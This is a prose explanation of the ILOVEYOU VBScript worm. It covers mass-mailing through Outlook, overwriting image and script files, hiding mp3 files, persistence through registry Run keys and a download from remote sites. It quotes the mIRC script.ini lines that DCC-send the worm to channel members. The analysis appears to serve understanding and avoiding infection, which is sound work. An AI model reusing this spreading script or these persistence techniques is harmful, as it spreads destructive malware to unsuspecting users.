Code is almost self-explanatory and ext ely simple, just read it. In synthesis:
User opens worm file (by doubleclicking on it, duh)
The worm's malicious code accessses Micro$oft's Outlook address book and sends a copy of itself to every entry
then it copies itself into IMAGES (jpg and jpeg)
visual basic scripts (vbs and vbe)
and java (je and jse)
deleting their previous contents
Music files (mp3 and mp2) are hidden, and a file of the same name is created and substitutes them. It contains the worm script with a vbs file extension (you are looking at it)
To summarize: When the worm is executed, it replaces a lot of files with copies of itself (that's the worm attitude, duh) that means that it will search for certain types of files and make changes to those files depending on the type of file. On fixed or network drives, it will act as follows:
  • For files whose extension is vbs or vbe it will replace those files with a copy of itself
  • For files whose extensions are js, jse, css, wsh, sct, or hta, it will replace those files with a copy of itself and change the extension to vbs. For example, a file named x.css will be replaced with a file named x.vbs containing a copy of the worm
  • For files whose extension is jpg or jpeg, it will replace those files with a copy of the worm and add a vbs extension. For example, a file named x.jpg will be replaced by a file called x.jpg.vbs containing a copy of the worm
  • For files whose extension is mp3 or mp2, it will create a copy of itself in a file named with a vbs extension in the same manner as for a jpg file. The original file is preserved, but its attributes are changed to hidden
Since the modified files are overwritten by the worm code rather than being deleted, file recovery is difficult and may be impossible. Thus, users executing files that have been modified in this step will cause the worm to begin executing again. If those same files are on a filesystem shared over a local area network, new users will be affected.
Iloveyou will also infect files on networked mapped drives & send itself to people who join a chatroom and are infected (through the MIRC appz, see the scriptini.WriteLine part)
If the file name being examined is mirc32.exe, mlink32.exe, mirc.ini, script.ini or mirc.hlp, it will create a file named script.ini in the same folder. The script.ini file will contain: 
[script]

   n0=on 1:JOIN:#:{
   n1=  /if ( $nick == $me ) { halt }
   n2=  /.dcc send $nick DIRSYSTEM\LOVE-LETTER-FOR-YOU.HTM
   n3=}
where DIRSYSTEM varies based on the platform where the worm is executed. If the file script.ini already exists, no changes occur.
This code defines a script: whenever an infected user joins a channel in IRC, a copy of the worm will be sent to others on the channel via DCC. The script.ini file is created only once per folder processed by the worm.
Finally the worm will try to contact at random one of four web sites in the Philippines that should have a file called WIN-BUGSFIX.EXE (these sites do not exist any more, and I'm not to reverse that file anyway, duh). This works in the following way: If the file \WinFAT32.exe exists, the worm sets the Internet Explorer Start page to one of those four randomly selected URLs, which all refer to a file named WIN-BUGSFIX.exe, which contains quite malicious code. The worm checks for this file in the Internet Explorer downloads directory, and if found, it adds the malicious file to the list of programs to run at reboot. The Internet Explorer Start page is then reset to "about:blank", which is quite a courteous feature, come to think of it.
In addition to other changes, the worm updates the following registry keys: 
   HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32
   HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL
   HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX
   HKCU\Software\Microsoft\Windows Scripting Host\Settings\Timeout
   HKCU\Software\Microsoft\Internet Explorer\Main\Start Page
   HKCU\Software\Microsoft\WAB\*
If you have read (and understood) the above, you'll easily be able to avoid any infection from this kind of kids-scripts.
